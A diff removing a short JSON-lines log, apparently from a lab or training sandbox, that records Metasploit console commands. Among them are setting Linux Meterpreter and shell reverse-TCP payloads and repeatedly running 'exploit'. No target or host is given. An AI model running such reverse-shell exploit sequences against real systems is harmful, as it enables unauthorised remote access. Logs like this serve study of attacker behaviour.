@@ -1,9 +1,0 @@
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:01:15.337307Z", "cmd_type": "msf-command", "cmd": "show advanced"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:01:37.470913Z", "cmd_type": "msf-command", "cmd": "set ConsoleLock false"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:01:41.026921Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:02:13.762926Z", "cmd_type": "msf-command", "cmd": "set payload linux/x64/meterpreter/reverse_tcp "}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:02:17.818982Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:02:50.999970Z", "cmd_type": "msf-command", "cmd": "set payload linux/x64/shell_reverse_tcp "}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:02:54.567430Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:03:21.083329Z", "cmd_type": "msf-command", "cmd": "set Xdisplay 0"}
-{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:03:24.733082Z", "cmd_type": "msf-command", "cmd": "exploit"}
